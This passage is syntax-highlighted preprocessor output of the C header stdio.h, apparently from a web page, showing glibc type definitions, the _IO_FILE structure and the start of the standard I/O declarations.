class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/wordsize.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">20</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/timesize.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">22</span> <span class="hljs-string">&quot;/usr/include/features-time64.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">395</span> <span class="hljs-string">&quot;/usr/include/features.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">502</span> <span class="hljs-string">&quot;/usr/include/features.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/sys/cdefs.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">576</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/sys/cdefs.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/wordsize.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">577</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/sys/cdefs.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/long-double.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">578</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/sys/cdefs.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">503</span> <span class="hljs-string">&quot;/usr/include/features.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">526</span> <span class="hljs-string">&quot;/usr/include/features.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/gnu/stubs.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">10</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/gnu/stubs.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/gnu/stubs-64.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">11</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/gnu/stubs.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">527</span> <span class="hljs-string">&quot;/usr/include/features.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">34</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/libc-header-start.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">29</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><br><br><br><br><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/lib/gcc/x86_64-linux-gnu/13/include/stddef.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">214</span> <span class="hljs-string">&quot;/usr/lib/gcc/x86_64-linux-gnu/13/include/stddef.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><br># <span class="hljs-number">214</span> <span class="hljs-string">&quot;/usr/lib/gcc/x86_64-linux-gnu/13/include/stddef.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-type">size_t</span>;<br># <span class="hljs-number">35</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><br><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/lib/gcc/x86_64-linux-gnu/13/include/stdarg.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">40</span> <span class="hljs-string">&quot;/usr/lib/gcc/x86_64-linux-gnu/13/include/stdarg.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">typedef</span> __builtin_va_list __gnuc_va_list;<br># <span class="hljs-number">38</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">27</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/wordsize.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">28</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/timesize.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">19</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/timesize.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/wordsize.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">20</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/timesize.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">29</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> __u_char;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> __u_short;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __u_int;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> __u_long;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">signed</span> <span class="hljs-type">char</span> <span class="hljs-type">__int8_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> <span class="hljs-type">__uint8_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">signed</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> <span class="hljs-type">__int16_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> <span class="hljs-type">__uint16_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">signed</span> <span class="hljs-type">int</span> <span class="hljs-type">__int32_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-type">__uint32_t</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">signed</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__int64_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__uint64_t</span>;<br><br><br><br><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__int8_t</span> <span class="hljs-type">__int_least8_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__uint8_t</span> <span class="hljs-type">__uint_least8_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__int16_t</span> <span class="hljs-type">__int_least16_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__uint16_t</span> <span class="hljs-type">__uint_least16_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__int32_t</span> <span class="hljs-type">__int_least32_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__uint32_t</span> <span class="hljs-type">__uint_least32_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__int64_t</span> <span class="hljs-type">__int_least64_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__uint64_t</span> <span class="hljs-type">__uint_least64_t</span>;<br><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__quad_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__u_quad_t</span>;<br><br><br><br><br><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__intmax_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__uintmax_t</span>;<br># <span class="hljs-number">141</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/typesizes.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">142</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/time64.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">143</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__dev_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-type">__uid_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-type">__gid_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__ino_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__ino64_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-type">__mode_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__nlink_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__off_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__off64_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> <span class="hljs-type">__pid_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-type">int</span> __val[<span class="hljs-number">2</span>]; &#125; <span class="hljs-type">__fsid_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__clock_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__rlim_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__rlim64_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-type">__id_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__time_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-type">__useconds_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__suseconds_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__suseconds64_t</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> <span class="hljs-type">__daddr_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> <span class="hljs-type">__key_t</span>;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> <span class="hljs-type">__clockid_t</span>;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">void</span> * <span class="hljs-type">__timer_t</span>;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__blksize_t</span>;<br><br><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__blkcnt_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__blkcnt64_t</span>;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__fsblkcnt_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__fsblkcnt64_t</span>;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__fsfilcnt_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__fsfilcnt64_t</span>;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__fsword_t</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__ssize_t</span>;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__syscall_slong_t</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__syscall_ulong_t</span>;<br><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__off64_t</span> <span class="hljs-type">__loff_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> *<span class="hljs-type">__caddr_t</span>;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__intptr_t</span>;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-type">__socklen_t</span>;<br><br><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> <span class="hljs-type">__sig_atomic_t</span>;<br># <span class="hljs-number">40</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types/__fpos_t.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><br><br><br><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types/__mbstate_t.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">13</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types/__mbstate_t.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">int</span> __count;<br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __wch;<br>    <span class="hljs-type">char</span> __wchb[<span class="hljs-number">4</span>];<br>  &#125; __value;<br>&#125; <span class="hljs-type">__mbstate_t</span>;<br># <span class="hljs-number">6</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types/__fpos_t.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><br><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">G_fpos_t</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">__off_t</span> __pos;<br>  <span class="hljs-type">__mbstate_t</span> __state;<br>&#125; <span class="hljs-type">__fpos_t</span>;<br># <span class="hljs-number">41</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types/__fpos64_t.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">10</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types/__fpos64_t.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">G_fpos64_t</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">__off64_t</span> __pos;<br>  <span class="hljs-type">__mbstate_t</span> __state;<br>&#125; <span class="hljs-type">__fpos64_t</span>;<br># <span class="hljs-number">42</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types/__FILE.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span>;</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> __<span class="hljs-title">FILE</span>;</span><br># <span class="hljs-number">43</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types/FILE.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span>;</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> <span class="hljs-title">FILE</span>;</span><br># <span class="hljs-number">44</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types/struct_FILE.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">35</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types/struct_FILE.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span>;</span><br><br><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">void</span> _IO_lock_t;<br><br><br><br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">int</span> _flags;<br><br><br>  <span class="hljs-type">char</span> *_IO_read_ptr;<br>  <span class="hljs-type">char</span> *_IO_read_end;<br>  <span class="hljs-type">char</span> *_IO_read_base;<br>  <span class="hljs-type">char</span> *_IO_write_base;<br>  <span class="hljs-type">char</span> *_IO_write_ptr;<br>  <span class="hljs-type">char</span> *_IO_write_end;<br>  <span class="hljs-type">char</span> *_IO_buf_base;<br>  <span class="hljs-type">char</span> *_IO_buf_end;<br><br><br>  <span class="hljs-type">char</span> *_IO_save_base;<br>  <span class="hljs-type">char</span> *_IO_backup_base;<br>  <span class="hljs-type">char</span> *_IO_save_end;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><br>  <span class="hljs-type">int</span> _fileno;<br>  <span class="hljs-type">int</span> _flags2;<br>  <span class="hljs-type">__off_t</span> _old_offset;<br><br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  _IO_lock_t *_lock;<br><br><br><br><br><br><br><br>  <span class="hljs-type">__off64_t</span> _offset;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *_<span class="hljs-title">codecvt</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *_<span class="hljs-title">wide_data</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">freeres_list</span>;</span><br>  <span class="hljs-type">void</span> *_freeres_buf;<br>  <span class="hljs-type">size_t</span> __pad5;<br>  <span class="hljs-type">int</span> _mode;<br><br>  <span class="hljs-type">char</span> _unused2[<span class="hljs-number">15</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">int</span>) - <span class="hljs-number">4</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">void</span> *) - <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">size_t</span>)];<br>&#125;;<br># <span class="hljs-number">45</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><br><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types/cookie_io_functions_t.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">27</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types/cookie_io_functions_t.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__ssize_t</span> <span class="hljs-title function_">cookie_read_function_t</span> <span class="hljs-params">(<span class="hljs-type">void</span> *__cookie, <span class="hljs-type">char</span> *__buf,</span><br><span class="hljs-params">                                          <span class="hljs-type">size_t</span> __nbytes)</span>;<br><br><br><br><br><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__ssize_t</span> <span class="hljs-title function_">cookie_write_function_t</span> <span class="hljs-params">(<span class="hljs-type">void</span> *__cookie, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__buf,</span><br><span class="hljs-params">                                           <span class="hljs-type">size_t</span> __nbytes)</span>;<br><br><br><br><br><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> <span class="hljs-title function_">cookie_seek_function_t</span> <span class="hljs-params">(<span class="hljs-type">void</span> *__cookie, <span class="hljs-type">__off64_t</span> *__pos, <span class="hljs-type">int</span> __w)</span>;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> <span class="hljs-title function_">cookie_close_function_t</span> <span class="hljs-params">(<span class="hljs-type">void</span> *__cookie)</span>;<br><br><br><br><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_cookie_io_functions_t</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">cookie_read_function_t</span> *read;<br>  <span class="hljs-type">cookie_write_function_t</span> *write;<br>  <span class="hljs-type">cookie_seek_function_t</span> *seek;<br>  <span class="hljs-type">cookie_close_function_t</span> *close;<br>&#125; <span class="hljs-type">cookie_io_functions_t</span>;<br># <span class="hljs-number">48</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><br><br><br><br><br><span class="hljs-keyword">typedef</span> __gnuc_va_list va_list;<br># <span class="hljs-number">64</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__off_t</span> <span class="hljs-type">off_t</span>;<br># <span class="hljs-number">78</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__ssize_t</span> <span class="hljs-type">ssize_t</span>;<br><br><br><br><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__fpos_t</span> <span class="hljs-type">fpos_t</span>;<br># <span class="hljs-number">129</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/stdio_lim.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">130</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">149</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> FILE *<span class="hljs-built_in">stdin</span>;<br><span class="hljs-keyword">extern</span> FILE *<span class="hljs-built_in">stdout</span>;<br><span class="hljs-keyword">extern</span> FILE *<span class="hljs-built_in">stderr</span>;<br><br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">remove</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__filename)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span>;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> 